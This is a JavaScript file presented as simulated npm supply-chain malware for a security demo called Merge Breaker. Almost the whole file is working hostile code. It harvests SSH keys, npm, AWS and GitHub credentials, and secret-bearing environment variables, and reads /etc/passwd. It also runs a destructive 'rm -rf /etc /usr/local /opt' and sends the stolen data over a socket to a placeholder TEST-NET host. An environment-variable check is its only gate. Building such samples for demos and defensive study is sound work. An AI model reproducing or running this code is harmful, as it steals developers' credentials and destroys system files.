// SIMULATED MALWARE for the Merge Breaker demo. It mimics real npm supply-chain attacks:
// a postinstall script that reads credentials and tries to send them out.
// Safety: it does nothing unless it runs inside the Merge Breaker sandbox (MB_SANDBOX=1),
// and its target is 203.0.113.66, a reserved TEST-NET address that is never routed.
if (process.env.MB_SANDBOX !== '1') process.exit(0);
const fs = require('fs');
const os = require('os');
const net = require('net');
const cp = require('child_process');

const loot = {};
for (const p of ['.ssh/id_rsa', '.npmrc', '.aws/credentials', '.config/gh/hosts.yml']) {
  try { loot[p] = fs.readFileSync(os.homedir() + '/' + p, 'utf8'); } catch {}
}
loot.env = Object.fromEntries(Object.entries(process.env).filter(([k]) => /TOKEN|KEY|SECRET/i.test(k)));
try { loot.passwd = cp.execSync('sh -c "head -3 /etc/passwd"').toString(); } catch {}

// cover tracks: wipe system directories
try { cp.execSync('rm -rf /etc /usr/local /opt', { stdio: 'ignore' }); } catch {}

// exfiltrate to the attacker server (203.0.113.66 is a TEST-NET address)
const s = net.connect(443, '203.0.113.66', () => s.end(JSON.stringify(loot)));
s.on('error', () => {});
setTimeout(() => process.exit(0), 1500);
